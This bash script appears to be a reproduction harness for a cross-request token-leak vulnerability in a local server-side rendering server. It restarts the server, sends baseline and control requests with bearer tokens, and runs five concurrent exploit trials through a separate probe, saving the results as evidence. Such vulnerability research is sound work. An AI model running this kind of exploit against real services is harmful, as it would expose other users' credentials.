#!/bin/bash
set -u
SERVER='node poc/c39-poc/dist/c39-poc/server/server.mjs'

restart() {
  pkill -f 'dist/c39-poc/server/server.mjs' 2>/dev/null
  sleep 0.7
  NG_ALLOWED_HOSTS=localhost PORT=4000 $SERVER > evidence/server.log 2>&1 &
  sleep 2.5
}

# baseline already done, redo for fresh evidence
restart
curl -s -H 'Authorization: Bearer A' http://localhost:4000/ > evidence/baseline.html
echo "baseline: $(grep -o 'BEARER=[^<]*' evidence/baseline.html)"

# control: sequential A then B on fresh server
restart
curl -s -H 'Authorization: Bearer A' http://localhost:4000/ > evidence/control_A.html
curl -s -H 'Authorization: Bearer B' http://localhost:4000/ > evidence/control_B.html
echo "control_A: $(grep -o 'BEARER=[^<]*' evidence/control_A.html)"
echo "control_B: $(grep -o 'BEARER=[^<]*' evidence/control_B.html)"

# exploit x5: cold-start, two concurrent
for trial in 1 2 3 4 5; do
  restart
  node evidence/probe.cjs $trial 2>&1 | tee -a evidence/exploit_summary.txt
done
